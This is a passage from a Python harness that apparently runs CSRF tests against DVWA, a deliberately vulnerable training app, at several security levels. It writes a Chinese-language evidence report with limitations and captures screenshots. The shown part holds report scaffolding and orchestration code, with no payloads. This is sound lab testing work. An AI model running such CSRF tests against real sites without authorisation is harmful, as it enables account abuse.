- 操作日志: `{rel(OPLOG_PATH)}`
- 请求证据目录: `{rel(REQUESTS_DIR)}`
- 截图目录: `{rel(SCREENSHOTS_DIR)}`
- 生成 harness: `{rel(Path(__file__))}`

{extraction}

## Limitations
- 本次未通过 Burp/ZAP 代理保留外部代理历史；所有 HTTP 证据由 Python/requests 请求记录文件保存。
- high 的 token-aware 成功是同源/已授权 harness 场景，不等同于外部站点可直接发起盲 CSRF。
- 浏览器 SameSite 默认策略可能影响真实跨站攻击可行性；本实验重点是 DVWA 服务端校验逻辑。
"""

    def run(self):
        for d in [REQUESTS_DIR, SCREENSHOTS_DIR, HARNESS_DIR]:
            d.mkdir(parents=True, exist_ok=True)
        if OPLOG_PATH.exists():
            OPLOG_PATH.unlink()
        self.log("setup", "harness", "start", BASE_URL, "run initialized")
        self.login()
        self.run_low()
        self.run_medium()
        self.run_high()
        self.run_impossible()
        try:
            self.capture_screenshots()
        except Exception as exc:
            self.screenshot_status["attempted"] = True
            self.screenshot_status["note"] = f"Playwright screenshot attempt raised exception: {exc}"
            self.log("screenshots", "Playwright", "capture authenticated screenshots", "", self.screenshot_status["note"])
        self.write_report()


if __name__ == "__main__":
    try:
        Harness().run()
    except Exception as exc:
        import traceback

        error_path = RUN_DIR / "harness-error.txt"
        error_path.write_text(traceback.format_exc(), encoding="utf-8")
        raise
